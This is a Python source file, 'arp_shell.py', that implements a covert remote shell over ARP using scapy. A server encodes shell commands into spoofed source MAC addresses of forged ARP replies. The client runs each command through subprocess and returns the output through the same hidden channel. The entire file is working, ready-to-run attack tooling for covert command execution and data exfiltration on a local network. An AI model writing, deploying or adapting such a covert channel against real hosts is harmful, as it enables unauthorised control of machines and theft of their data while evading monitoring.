#!/usr/bin/python3

from scapy.all import ARP, Ether, sendp, sniff, srp1
import logging, math, time, subprocess, sys

## Notes:
# - Requires sudo (to access raw sockets)
# - I recommend using "tcpdump -i <interace> arp" to debug

server_ip = "192.168.1.xxx" # Server sends commands
client_ip = "192.168.1.xxx" # Client receives and executes commands
broadcast_ip = "192.16.2.x" # IP spoofed by both client and server, used as an indicator for relevant packets

# Request the hardware address of the target_ip
def arp_request(target_ip: str):
    mac = srp1(
            # dst="ff:ff:ff:ff:ff:ff" broadcasts the request to the whole network
            Ether(dst="ff:ff:ff:ff:ff:ff")
            / ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff"),
            timeout=.5,
            verbose=0,
        )
    return mac # None if unresolved

# Resolve the target_ip to a hardware address
def resolve_ip(target_ip: str):
    logging.debug(f"Resolving ip {target_ip}")
    mac = arp_request(target_ip)
    if mac:
        logging.debug(f"Resolved to {mac.hwsrc}")
        return mac.hwsrc
    else:
        # Exit if failed
        print(f"IP not resolved")
        sys.exit(0)

## Data encoding
# - Data is transmitted as mac addresses, which are 12 bytes of hex
# - Therefore each packet can transmit 6 characters before hex encoding
# - To mark the end of a transmission and keep packets at length 12, null bytes pad the end of the message

def hex_encode(data: str):
    return data.encode("utf-8").hex()

def hex_decode(data: str):
    return bytearray.fromhex(data).decode()

def hex_to_mac(data: str):
    return":".join(data[i:i+2] for i in range(0, 12, 2))

def mac_to_hex(data: str):
    return data.replace(":", "")

def data_to_macs(data: str):
    encoded = hex_encode(data) + "00"
    num_req = math.ceil(len(encoded) / 12)
    mac_adders = []
    for i in range(0, num_req):
        next_12_bytes = encoded[12 * i: 12 + (12 * i)] 
        padding = "00" * round((12 - len(next_12_bytes)) / 2) # pad with null bytes
        mac = hex_to_mac(next_12_bytes + padding)
        mac_adders = mac_adders + [mac]
    return mac_adders

def macs_to_data(macs: str):
    return [hex_decode(mac_to_hex(m)) for m in macs]

def packets_to_data(packets):
    return macs_to_data([p.hwsrc for p in packets])


def receive(paired_ip: str):
    # Sniff arp packets to/from paired_ip
    # Stop when a packet with a src mac address containing a null byte is received
    logging.debug(f"Receiving packets from {paired_ip}") 
    packets = sniff(
        filter = "arp host " + paired_ip,
        stop_filter = lambda p: "\x00" in hex_decode(mac_to_hex(p.hwsrc)),
        prn = lambda p: logging.debug(f"...packet for data {hex_decode(mac_to_hex(p.hwsrc))} received from hwsrc {p.hwsrc}")
    )
    data = packets_to_data(packets)
    return "".join(data).replace("\x00", "")


def send(data: str, target_ip: str, target_mac: str):
    macs = data_to_macs(data)
    logging.debug(f"Sending data to {target_ip} at {target_mac}; spoofing {broadcast_ip}")

    for mac in macs:
        d = hex_decode(mac_to_hex(mac))
        logging.debug(f"...packet for data {d} sent w/ hwsrc {mac}")

        target_packet = Ether(src=mac, dst=target_mac) / ARP(
            op=2, hwsrc=mac, psrc=broadcast_ip, hwdst=target_mac, pdst=target_ip
        )
        sendp(target_packet, verbose=0)
        time.sleep(.1)


def client():
    server_mac = resolve_ip(server_ip)
    while True:
        cmd = receive(broadcast_ip)
        args = cmd.split(" ")
        res = subprocess.run(args, stdout=subprocess.PIPE).stdout # Get cmd output as bytes
        res = res.decode("utf-8").rstrip()
        logging.debug(f"ran {cmd} and sending result {res}")
        time.sleep(.5) # Give time for server to begin listening
        send(res, server_ip, server_mac)   


def server():
    client_mac = resolve_ip(client_ip)
    while True:
        cmd = input("$ ")
        if cmd == "exit":
            return
        send(cmd, client_ip, client_mac)
        res = receive(broadcast_ip)
        print(res)


def help_text():
    print("arp_shell.py <mode>")
    print("...0 for client, 1 for server")
    print("...both modes must be run as root")
    sys.exit(0)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        help_text()
    if "x" in client_ip or "x" in server_ip:
        print("ERROR: client_ip or server_ip not added")
        help_text()

    mode = sys.argv[1] # Expects 0 for client, 1 for server
    logging.basicConfig(
        format='%(message)s', 
        stream=sys.stderr, 
        level=logging.DEBUG # DEBUG (extra info) or INFO (only shell)
    )

    if mode in "0": 
        client()
    elif mode in "1":
        server()
    else:
        help_text()

 
